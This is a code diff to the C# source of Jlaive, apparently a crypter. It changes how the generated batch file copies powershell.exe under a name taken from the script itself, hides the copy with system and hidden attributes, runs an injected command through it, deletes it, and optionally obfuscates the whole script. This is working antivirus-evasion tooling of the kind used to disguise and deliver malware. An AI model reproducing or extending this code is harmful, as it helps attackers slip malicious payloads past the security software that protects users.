@@ -97,12 +97,12 @@ namespace Jlaive
             Console.WriteLine("Constructing batch file...");
             StringBuilder toobf = new StringBuilder();
             toobf.AppendLine("rem https://github.com/ch2sh/Jlaive");
-            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
-            toobf.AppendLine("attrib +s +h pshell.exe");
+            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe %~n0.bat.exe /y");
+            toobf.AppendLine("attrib +s +h %~n0.bat.exe");
             toobf.AppendLine("cls");
             toobf.AppendLine(command);
-            toobf.AppendLine("attrib -s -h pshell.exe");
-            toobf.Append("del pshell.exe");
+            toobf.AppendLine("attrib -s -h %~n0.bat.exe");
+            toobf.Append("del %~n0.bat.exe");
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
             if (_obfuscate) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
